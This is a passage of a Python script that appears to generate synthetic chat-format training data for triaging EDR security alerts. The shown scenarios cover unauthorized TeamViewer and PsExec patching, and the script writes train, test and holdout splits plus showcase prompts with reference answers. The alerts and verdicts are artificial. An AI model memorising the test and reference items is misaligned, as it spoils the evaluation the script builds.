        t.update(verdict="True Positive", conf="High", sev="Medium",
                 mitre="T1219 - Remote Access Software",
                 summary="A user installed TeamViewer on a non-helpdesk workstation; RAT-01 limits TeamViewer to SCCM-deployed copies on IT Helpdesk hosts, so this is an unauthorized remote access tool.")
        t["evidence"].append("approved_tools_allowlist.md entry RAT-01 approves TeamViewer only when SCCM-deployed on IT Helpdesk hosts, which this is not.")
        t["actions"] = ["Uninstall TeamViewer from {} and block the installer hash.".format(a["host"]),
                        "Ask the user why it was installed and whether anyone connected to the machine.",
                        "Review TeamViewer connection logs on the host for inbound sessions."]
        t["sources"].append(doc)

    elif scen == "psexec_benign":
        kb = a["_kb"]
        if R.random() < 0.6:
            docs.append((CAL, "CHG-{}: Deploy {} to application servers via PsExec from JMP-ADM jump servers, 01:00-04:00 UTC, Server Operations.".format(R.randint(40000, 49999), kb)))
            t.update(conf="High")
            t["evidence"].append("change_calendar.md lists an approved change deploying {} from the jump servers in this window.".format(kb))
            t["actions"] = ["Close as Benign True Positive; the change is approved."]
            t["sources"].append(CAL)
        else:
            docs.append(distractor())
            docs.append((CAL, "CHG-{}: Deploy KB50{} to application servers, next Tuesday 01:00-04:00 UTC, Server Operations.".format(R.randint(40000, 49999), R.randint(30000, 49999))))
            t.update(verdict="Needs Investigation", conf="Medium", sev="Medium",
                     mitre="T1569.002 - System Services: Service Execution",
                     summary="The activity looks like patching from a jump server, but change_calendar.md has no approved change for {} tonight.".format(kb))
            t["evidence"].append("change_calendar.md has no approved change for {} in this window.".format(kb))
            t["actions"] = ["Contact Server Operations to confirm whether this deployment was authorized.",
                            "If no one claims it, disable the admin account and escalate as lateral movement."]
            t["sources"].append(CAL)
        doc, text, sent = SUPPORT_DOCS["psexec_benign"]
        docs.append((doc, text))
        t["evidence"].append(sent)
        t["sources"].append(doc)

    elif scen in SUPPORT_DOCS:
        doc, text, sent = SUPPORT_DOCS[scen]
        docs.append((doc, text))
        t["evidence"].append(sent)
        t["sources"].append(doc)
        add_playbook(scen, t, docs)

    elif scen in PLAYBOOK_FOR:
        add_playbook(scen, t, docs)

    else:
        return None

    if R.random() < 0.7:
        docs.append(distractor())
    R.shuffle(docs)
    # de-duplicate sources while keeping order
    seen = set()
    t["sources"] = [s for s in t["sources"] if not (s in seen or seen.add(s))]
    return docs, t


# ================================================================= rendering
def render_alert(a):
    if R.random() < 0.5:
        return "\n".join([
            "EDR ALERT",
            "Detection: {}".format(a["title"]),
            "Vendor severity: {}".format(a["vendor_sev"]),
            "Timestamp: {}".format(a["time"]),
            "Host: {} (Device group: {}, OS: {})".format(a["host"], a["group"], a["os"]),
            "User: {}".format(a["user"]),
            "Process: {}".format(a["process"]),
            "Command line: {}".format(a["cmdline"]),
            "Process tree: {}".format(a["tree"]),
            "Signature: {}".format(a["signature"]),
            "Prevalence: {}".format(a["prevalence"]),
            "SHA256: {}".format(a["sha"]),
            "Network: {}".format(a["network"]),
            "Additional context: {}".format(a["extra"])])
    return "EDR ALERT (JSON)\n" + json.dumps({
        "detection_name": a["title"], "severity": a["vendor_sev"], "timestamp": a["time"],
        "device": {"hostname": a["host"], "device_group": a["group"], "os": a["os"]},
        "user": a["user"],
        "process": {"image": a["process"], "command_line": a["cmdline"], "ancestry": a["tree"],
                    "signature": a["signature"], "prevalence": a["prevalence"], "sha256": a["sha"]},
        "network": a["network"], "context": a["extra"]}, indent=2)


def render_triage(t):
    lines = ["Verdict: {}".format(t["verdict"]),
             "Confidence: {}".format(t["conf"]),
             "Severity: {}".format(t["sev"]),
             "MITRE ATT&CK: {}".format(t["mitre"]),
             "Summary: {}".format(t["summary"]),
             "Key evidence:"]
    lines += ["- " + e for e in t["evidence"]]
    lines.append("Recommended actions:")
    lines += ["{}. {}".format(i + 1, x) for i, x in enumerate(t["actions"])]
    if t.get("sources"):
        lines.append("Sources: " + ", ".join(t["sources"]))
    return "\n".join(lines)


def make_example(fn, rag=False):
    a, t = fn()
    scen = fn.__name__
    context = rag_context(scen, a, t) if rag else None
    if context:
        docs, t = context
        ctx = "Retrieved context:\n\n" + "\n\n".join("[{}]\n{}".format(d, x) for d, x in docs) + "\n\n"
    else:
        ctx = ""
    user_msg = ctx + pick(OPENERS) + "\n\n" + render_alert(a)
    return {
        "conversations": [
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": user_msg},
            {"role": "assistant", "content": render_triage(t)},
        ],
        "meta": {"scenario": scen, "rule": a["rule"], "verdict": t["verdict"],
                 "mitre": t["mitre"].split(" - ")[0], "host": a["host"], "rag": bool(context)},
    }


def write_jsonl(path, rows):
    with open(path, "w", encoding="utf-8") as f:
        for r in rows:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")


def main():
    global R
    os.makedirs(OUT_DIR, exist_ok=True)
    main_rows, holdout = [], []
    for fn in VARIANTS:
        for _ in range(SAMPLES_PER_VARIANT):
            row = make_example(fn, rag=R.random() < RAG_FRACTION)
            (holdout if fn.__name__ in HOLDOUT_VARIANTS else main_rows).append(row)
    R.shuffle(main_rows)
    n_test = int(len(main_rows) * TEST_FRACTION)
    test, train = main_rows[:n_test], main_rows[n_test:]

    write_jsonl(os.path.join(OUT_DIR, "train.jsonl"), train)
    write_jsonl(os.path.join(OUT_DIR, "test.jsonl"), test)
    write_jsonl(os.path.join(OUT_DIR, "test_holdout.jsonl"), holdout)

    with open(os.path.join(OUT_DIR, "preview.csv"), "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["split", "scenario", "rule", "host", "mitre", "verdict", "has_rag_context"])
        for split, data in (("train", train), ("test", test), ("holdout", holdout)):
            for r in data:
                m = r["meta"]
                w.writerow([split, m["scenario"], m["rule"], m["host"], m["mitre"], m["verdict"], m["rag"]])

    # Showcase alerts for the 3-tier comparison: fresh seed, alert only (no context).
    R = random.Random(2026)
    show = []
    for fn in (ps_encoded_sccm, lsass_werfault, ps_encoded_fake_sccm, psexec_ambiguous):
        a, t = fn()
        show.append((fn.__name__, render_alert(a), render_triage(t)))
    with open(os.path.join(OUT_DIR, "showcase_alerts.md"), "w", encoding="utf-8") as f:
        f.write("# Showcase alerts for the base vs fine-tuned vs RAG comparison\n\n")
        f.write("Generated with a separate seed; not present in any split. Pick 3 of the 4.\n")
        f.write("Paste each prompt into every model tier. The reference answer is the alert-only answer;\n")
        f.write("with RAG, psexec_ambiguous may resolve differently depending on the roster document.\n\n")
        for i, (name, prompt, answer) in enumerate(show, 1):
            f.write("## Question {} ({})\n\n**Prompt**\n\n```\nTriage this alert:\n\n{}\n```\n\n".format(i, name, prompt))
            f.write("**Reference answer (alert only)**\n\n```\n{}\n```\n\n".format(answer))

    def counts(rows):
        c = {}
        for r in rows:
            c[r["meta"]["verdict"]] = c.get(r["meta"]["verdict"], 0) + 1
        return c
    print("train={} test={} holdout={}".format(len(train), len(test), len(holdout)))
    print("train verdicts:", counts(train))
    print("train examples with retrieved context:", sum(1 for r in train if r["meta"]["rag"]))


if __name__ == "__main__":
    main()
